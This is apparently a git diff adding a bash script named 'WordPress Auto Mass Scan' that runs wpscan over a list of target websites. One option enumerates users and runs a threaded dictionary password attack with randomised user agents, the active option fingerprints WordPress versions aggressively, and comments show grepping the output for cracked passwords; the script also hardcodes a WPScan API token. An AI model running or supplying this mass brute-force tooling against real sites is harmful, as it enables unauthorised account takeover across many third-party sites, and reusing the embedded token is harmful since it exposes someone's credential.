@@ -1,0 +1,86 @@
+
+#!/bin/bash
+# A script for scanning a file of targets based on wpscan
+
+#set -x
+
+clear
+
+printf "${BLUE}\n########################################################################\n${NORMAL}"
+printf "${RED}##                 WordPress Auto Mass Scan                              ##${NORMAL}\n"
+printf "${RED}##                     Leighton-0    (Oct 2024)                       ##${NORMAL}"
+printf "${BLUE}\n########################################################################${NORMAL}\n"
+
+
+sleep 2
+#"result.${d}.parsed""result.${d}.parsed"
+
+D=$(date +"%y%m%d")						# creates a date variable in the form yymmdd
+SECONDS=0
+#results=$(~/zresults/wp_websites.csv-aa_1.1.{D})		# not working ??
+#resultsave=$((echo "${results" | cut -d"/" -f2))
+#echo ${resultsave}
+rm results*
+rm counter.txt
+#printf "${RED} Results for $1 ${NORMAL}\n"
+I=0
+#wl_pass=~/mycode/reconftw/Recon/$1/hosts/ips.txt
+wl_pass=~/ztargets/wp_websites.csv-aa_1.1
+#wpscan --update
+printf "${BLUE}\n\n########################################################################\n${NORMAL}" >> "results.${D}"
+printf "${RED}##                 WordPress Auto Mass Scan                       ##${NORMAL}\n" >> "results.${D}"
+printf "${RED}##    target "${wl_pass}" result "result.${D}"                    ##${NORMAL}" >> "results.${D}"
+printf "${BLUE}\n########################################################################${NORMAL}\n\n\n" >> "results.${D}"
+##read -p $'\e[1;92m File path for targets: \e[0m' wl_pass	# -p prompt asks for a file name for the list of sites - names this site wl_pass
+wp_pass="${wl_pass}"						# creates a variable called wp_pass
+count_pass=$(wc -l $wp_pass | cut -d " " -f1)			# counts the number of lines in wp_pass file
+for fn in `cat ${wp_pass}`; do
+#printf "%s ${RED}TARGET NAME:- \n" $fn ${NORMAL}\n >> "results.{D}"
+printf "${RED}\n================================================================================$NORMAL\n" >> "results.${D}"
+printf "TARGET NAME:- %s \n" ${fn} >> "results.${D}"
+
+# OPTION 1  - identify uses and carry out dictionary attack
+password_brute() {
+	 wpscan --url $fn -e  u vp vt --passwords z_passwords --no-banner --no-update --random-user-agent --max-threads 20 --ignore-main-redirect --force >> "results.${D}"
+}
+
+# OPTION 2 - identify which sites are running WP from a file of IP addresses
+wp_confirm() {
+wpscan --url $fn --no-update --force --random-user-agent --ignore-main-redirect --wp-version-detection aggressive --no-banner --api-token s3KWluzJG9MQYtsy413EWzWm419hAUmdhs8sUaAWPhQ >> "results.${D}"
+					# --force disable WP detection; --wp-version-detection aggressive
+}
+
+I=$((I+1))
+printf "Loop number %-1d of %-.3d \n" $I  $count_pass >> counter.txt
+
+# Select option
+wp_confirm
+done
+#printf "Finished - check the results"
+printf '\n\n\n\n'
+ELAPSED="Elapsed: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
+    printf "\n${CYAN}Finished - Runtime = ${ELAPSED}${NORMAL}\n"
+
+#cat "results.${D}"
+
+#   README
+#   Usefull for parsing results
+#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
+
+#   TO DO
+#   Improve Parsing
+#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
+# cat results | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed" 
+
+# cat results.${d} | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed"
+
+# cat results.${d}.parsed
+
+#   README
+#   Usefull for parsing results
+#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
+
+#   TO DO
+#   Improve Parsing
+#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
+
